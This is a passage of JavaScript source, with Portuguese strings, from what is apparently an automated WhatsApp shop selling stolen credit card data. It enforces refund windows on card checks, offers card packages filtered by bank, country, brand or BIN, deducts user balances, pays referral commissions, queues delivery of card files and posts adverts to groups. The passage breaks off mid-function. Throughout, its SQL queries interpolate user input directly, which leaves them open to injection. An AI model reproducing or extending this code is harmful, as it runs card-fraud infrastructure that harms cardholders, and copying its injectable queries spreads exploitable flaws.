            console.log(parseInt(Data_MS_Inserido_Ultima_CC) + MINIMO_TEMPO_REEMBOLSO_MS)
            console.log(Date.now() > parseInt(Data_MS_Inserido_Ultima_CC) + MINIMO_TEMPO_REEMBOLSO_MS)

            if (Date.now() < parseInt(Data_MS_Inserido_Ultima_CC) + MINIMO_TEMPO_REEMBOLSO_MS) {
                Texto = `⚠️ *REEMBOLSO NÃO PERMITIDO*

*VOCÊ SÓ PODE PEDIR REEMBOLSO DEPOIS DE ${MINIMO_TEMPO_REEMBOLSO_CHK} MINUTOS*

*DATA E HORA DA ULTIMA COMPRA:* ${new Date(parseInt(Data_MS_Inserido_Ultima_CC)).toLocaleString()}
*DATA E HORA ATUAL:* ${new Date(parseInt(Date.now())).toLocaleString()}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }


            LIMITE_REEMBOLSO_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'LIMITE_REEMBOLSO_CHK'`).get()["VALOR"]
            timeParts = `00:${LIMITE_REEMBOLSO_CHK}`.split(":")
            //console.log((+timeParts[0] * (60000 * 60)) + (+timeParts[1] * 60000))
            LIMITE_REEMBOLSO_MS = (+timeParts[0] * (60000 * 60)) + (+timeParts[1] * 60000)

            Data_MS_Inserido_Ultima_CC = await DataBase_Better.prepare(`SELECT DATA_INSERIDO_MS FROM CHECAR_CC_V2 WHERE CONTATO = '${Mensagem_From}' ORDER BY DATA_INSERIDO_MS DESC LIMIT 1`).get()
            Data_MS_Inserido_Ultima_CC = Data_MS_Inserido_Ultima_CC["DATA_INSERIDO_MS"]

            console.log(Date.now())
            console.log(Data_MS_Inserido_Ultima_CC)
            console.log(parseInt(Data_MS_Inserido_Ultima_CC) + parseInt(LIMITE_REEMBOLSO_MS))
            console.log(parseInt(Data_MS_Inserido_Ultima_CC) + LIMITE_REEMBOLSO_MS)
            console.log(Date.now() > parseInt(Data_MS_Inserido_Ultima_CC) + LIMITE_REEMBOLSO_MS)

            if (Date.now() > parseInt(Data_MS_Inserido_Ultima_CC) + LIMITE_REEMBOLSO_MS) {
                Texto = `⚠️ *REEMBOLSO NÃO PERMITIDO*

*O LIMITE DE REEMBOLSO É DE ${LIMITE_REEMBOLSO_CHK} MINUTOS*

*DATA E HORA DA ULTIMA COMPRA:* ${new Date(parseInt(Data_MS_Inserido_Ultima_CC)).toLocaleString()}
*DATA E HORA ATUAL:* ${new Date(parseInt(Date.now())).toLocaleString()}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '7' WHERE _rowid_ = '${ITEM_FILA_CHK_REEMBOLSO["rowid"]}'`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳







        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_ID_Lista_Array_Partes[1] === "ccs_pacote") {
            iD_Footer = Date.now()

            //Opcoes_Pacote_CCs_MIX
            //Opcoes_Pacote_CCs_MIX_FULL
            //Opcoes_Pacote_CCs_NIVEL
            //Opcoes_Pacote_CCs_NIVEL_FULL
            //Opcoes_Pacote_CCs_BANCO
            //Opcoes_Pacote_CCs_BANCO_FULL
            //Opcoes_Pacote_CCs_PAIS
            //Opcoes_Pacote_CCs_PAIS_FULL
            //Opcoes_Pacote_CCs_BANDEIRA
            //Opcoes_Pacote_CCs_BANDEIRA_FULL
            //Opcoes_Pacote_CCs_BIN
            //Opcoes_Pacote_CCs_BIN_FULL

            TABELA = Mensagem_ID_Lista_Array_Partes[2]
            if (TABELA === "Opcoes_Pacote_CCs_MIX" || TABELA === "Opcoes_Pacote_CCs_MIX_FULL") {
                COLUNA = "MIX"
            }
            if (TABELA === "Opcoes_Pacote_CCs_NIVEL" || TABELA === "Opcoes_Pacote_CCs_NIVEL_FULL") {
                COLUNA = "NIVEL"
            }
            if (TABELA === "Opcoes_Pacote_CCs_BANCO" || TABELA === "Opcoes_Pacote_CCs_BANCO_FULL") {
                COLUNA = "BANCO"
            }
            if (TABELA === "Opcoes_Pacote_CCs_PAIS" || TABELA === "Opcoes_Pacote_CCs_PAIS_FULL") {
                COLUNA = "PAIS"
            }
            if (TABELA === "Opcoes_Pacote_CCs_BANDEIRA" || TABELA === "Opcoes_Pacote_CCs_BANDEIRA_FULL") {
                COLUNA = "BANDEIRA"
            }
            if (TABELA === "Opcoes_Pacote_CCs_BIN" || TABELA === "Opcoes_Pacote_CCs_BIN_FULL") {
                COLUNA = "BIN"
            }

            CONSTRUCAO_LISTMESSAGE_buttonText = "OPÇÕES DE PACOTE"
            CONSTRUCAO_LISTMESSAGE_title = `OPÇÕES DE PACOTE`
            CONSTRUCAO_LISTMESSAGE_description = `📦 *PACOTES DE CCs [${COLUNA}]* 📦

Clique em *OPÇÕES DE PACOTE* e escolha o pacote desejado e ao selecionar e enviar, caso você possua saldo suficiente, você estará efetuando a compra do mesmo.

⚠️*MUITA ATENÇÃO AO ESCOLHER UM DOS PACOTES!*⚠️`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            Array_Pacotes = await DataBase_Better.prepare(`SELECT _rowid_,* FROM ${TABELA}`).all()
            CONSTRUCAO_LISTMESSAGE_rows = []
            for await (item_Pacote of Array_Pacotes) {
                try {

                    if (TABELA === "Opcoes_Pacote_CCs_MIX" || TABELA === "Opcoes_Pacote_CCs_MIX_FULL") {
                        CONSTRUCAO_LISTMESSAGE_rows.push({
                            rowId: `${iD_Footer.toString()}|comprar_pacote|${TABELA}|${item_Pacote["rowid"]}|MIX|MIX`,
                            title: `📦 ${item_Pacote["QUANTIDADE"]} CCs`,
                            description: `💰 PREÇO R$: ${item_Pacote["VALOR"]}`
                        })
                    } else {
                        CONSTRUCAO_LISTMESSAGE_rows.push({
                            rowId: `${iD_Footer.toString()}|comprar_pacote|${TABELA}|${item_Pacote["rowid"]}|${COLUNA}|${item_Pacote[COLUNA]}`,
                            title: `📦 ${item_Pacote["QUANTIDADE"]} CCs ${COLUNA} (${item_Pacote[COLUNA]})`,
                            description: `💰 PREÇO R$: ${item_Pacote["VALOR"]}`
                        })
                    }

                } catch (error) {
                    console.log(error)
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_ID_Lista_Array_Partes[1] === "comprar_pacote") {

            TABELA_PACOTE = Mensagem_ID_Lista_Array_Partes[2]
            if (TABELA_PACOTE.indexOf("_FULL") > -1) {
                TIPOCC = "2"
            } else {
                TIPOCC = "1"
            }
            ID_PACOTE = Mensagem_ID_Lista_Array_Partes[3]
            COLUNA_PACOTE = Mensagem_ID_Lista_Array_Partes[4]
            PARAMETRO_PACOTE = Mensagem_ID_Lista_Array_Partes[5]

            QUANTIDADE_PACOTE = await DataBase_Better.prepare(`SELECT QUANTIDADE FROM ${TABELA_PACOTE} WHERE _rowid_ = '${ID_PACOTE}'`).get()["QUANTIDADE"]
            VALOR_PACOTE = await DataBase_Better.prepare(`SELECT VALOR FROM ${TABELA_PACOTE} WHERE _rowid_ = '${ID_PACOTE}'`).get()["VALOR"]

            if (COLUNA_PACOTE === "MIX") {
                Array_CCS = await DataBase_Better.prepare(`SELECT * FROM CCS WHERE TIPOCC = '${TIPOCC}' AND NIVEL NOT IN (SELECT NIVEL FROM NIVEL_IGNORAR)`).all();
                console.log(`ESTOQUE = ${(Array_CCS.length)} | QUANTIDADE = ${QUANTIDADE_PACOTE} | VALOR PCT: ${VALOR_PACOTE}`)
            } else {
                Array_CCS = await DataBase_Better.prepare(`SELECT * FROM CCS WHERE ${COLUNA_PACOTE} = '${PARAMETRO_PACOTE}' AND TIPOCC = '${TIPOCC}' AND NIVEL NOT IN (SELECT NIVEL FROM NIVEL_IGNORAR)`).all();
                console.log(`${COLUNA_PACOTE} = ${PARAMETRO_PACOTE} | ESTOQUE = ${(Array_CCS.length)} | QUANTIDADE = ${QUANTIDADE_PACOTE} | VALOR PCT: ${VALOR_PACOTE}`)
            }

            if (parseFloat(QUANTIDADE_PACOTE) > parseFloat(Array_CCS.length)) {

                Texto = `⚠️ *Quantidade de CCs no estoque é inferior a quantidade escolhida por você!*

⚙️ *NOSSA EQUIPE FOI NOTIFICADA* ⚙️

*Em breve o estoque será reabastecido*📦✅`

                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Texto = `⚠️*ATENÇÃO ADM*⚠️

*USUÁRIO wa.me/${Numero} TENTOU COMPRAR ${QUANTIDADE_PACOTE} CCs da tabela ${TABELA_PACOTE}, MAS SÓ TEM ${Array_CCS.length} CC NO ESTOQUE.*`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
            SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);

            console.log(`SALDO USER: ${SALDO_USUARIO} | VALOR PCT: ${VALOR_PACOTE}`)

            if (parseFloat(SALDO_USUARIO) < parseFloat(VALOR_PACOTE)) {

                Texto = `⚠️*Você não possui saldo suficiente para comprar este pacote.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(VALOR_PACOTE)
            NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2);
            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()

            VALOR_BASE_INDIC = VALOR_PACOTE
            Contato_Temp_Indic = Mensagem_From
            FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
            if (FUNCAO_ASSOCIADOS_PAGO === "1") {
                ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
                if (ATIVAR_ASSOCIADOS === "1") {

                    Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()
                    if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
                        NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()["NUMERO_INDICADOR"]
                        PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                        if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
                            PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                        } else {
                            PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
                        }

                        PIX_OU_COMPRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PIX_OU_COMPRA'`).get()["VALOR"]
                        if (PIX_OU_COMPRA === "1") {

                        } else if (PIX_OU_COMPRA === "2") {
                            VALOR_ADD_INDICADOR = ((parseFloat(PERCENTUAL_FINAL) * parseFloat(VALOR_BASE_INDIC)) / 100);
                            VALOR_ADD_INDICADOR = parseFloat(VALOR_ADD_INDICADOR).toFixed(2)
                            console.log(`VALOR_ADD_INDICADOR: ${VALOR_ADD_INDICADOR}`)

                            SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO_INDICACAO"]
                            SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2)
                            console.log(`SALDO_INDICACAO: ${SALDO_INDICACAO}`)

                            NOVO_SALDO_INDICACAO = parseFloat(SALDO_INDICACAO) + parseFloat(VALOR_ADD_INDICADOR)
                            NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2)
                            console.log(`NOVO_SALDO_INDICACAO: ${NOVO_SALDO_INDICACAO}`)

                            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '${NOVO_SALDO_INDICACAO}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
                            console.log(`Indicador:${NUMERO_INDICADOR} ganhou R$:${VALOR_ADD_INDICADOR}`)
                        }
                    }
                }
            }

            Texto_Usuario = `✅ *VOCÊ COMPROU UM PACOTE COM ${QUANTIDADE_PACOTE} CCs, AGUARDE QUE ESTAMOS GERANDO O ARQUIVO COM AS CCs PARA TE ENVIAR, ISSO PODE DEMORAR ALGUNS MINUTOS!* 🕒`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            await DataBase_Better.prepare(`INSERT INTO PREPARAR_PACOTEV3 (
CONTATO,
QUANTIDADE,
VALOR,
COLUNA,
PARAMETRO,
TIPOCC,
PROCESSADO,
DATA_INSERIDO_MS) VALUES (
'${Mensagem_From}',
'${QUANTIDADE_PACOTE}',
'${VALOR_PACOTE}',
'${COLUNA_PACOTE}',
'${PARAMETRO_PACOTE}',
'${TIPOCC}',
'0',
'${Date.now()}')`
            ).run()

            NOT_COMPROU_CC_MIX = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_CC_MIX'`).get()["VALOR"]
            if (NOT_COMPROU_CC_MIX === "1") {

                Texto_Grupo = `📦 *USUÁRIO COMPROU UM PACOTE DE CCS* 📦

👤 *USUÁRIO:* wa.me/${Numero}
📦 *COMPROU PACOTE DE* ${QUANTIDADE_PACOTE} *CCs*
🛠️ *${COLUNA_PACOTE}:* ${PARAMETRO_PACOTE}

────────────────

*VENHA ADQUIRIR AS MELHORES CCs DA NET!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}
`
                for await (Grupo of ID_GRUPOS) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_Mix_GP}',
'${Date.now()}')`).run()
                }
            }

            Texto_Adms = `📦 *PACOTE CCs COMPRADO*

👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}
📦 *TOTAL:* ${QUANTIDADE_PACOTE}
💰 *VALOR CC: R$:* ${VALOR_PACOTE}

*TABELA:* ${TABELA_PACOTE}
*${COLUNA_PACOTE}:* ${PARAMETRO_PACOTE}`
            for await (adm of Adms) {
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto_Adms}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            }
            console.log(`Pacote Comprado Numero: wa.me/${Numero} | Quantidade: ${QUANTIDADE_PACOTE} | Valor: ${VALOR_PACOTE}`)
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳






        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/bin ") > -1) {
            BUSCARPORBIN = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BUSCARPORBIN'`).get()["VALOR"]
            if (BUSCARPORBIN === "0") {
                Texto = `*Estamos ajustando esta função de pesquisar por BIN, enquanto isso, utilize os menus normalmente para comprar seu material.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            BOT_CC = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_CC'`).get()["VALOR"]
            if (BOT_CC === "1") {
                MODO_VENDA_UNIDADE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MODO_VENDA_UNIDADE'`).get()["VALOR"]
                if (MODO_VENDA_UNIDADE === "0") {
                    Texto = `Este bot não vende por unidade.`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    return
                }

                msg = Mensagem_Texto.split(" ")
                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                BIN = msg[1]
                iD_Footer = Date.now()

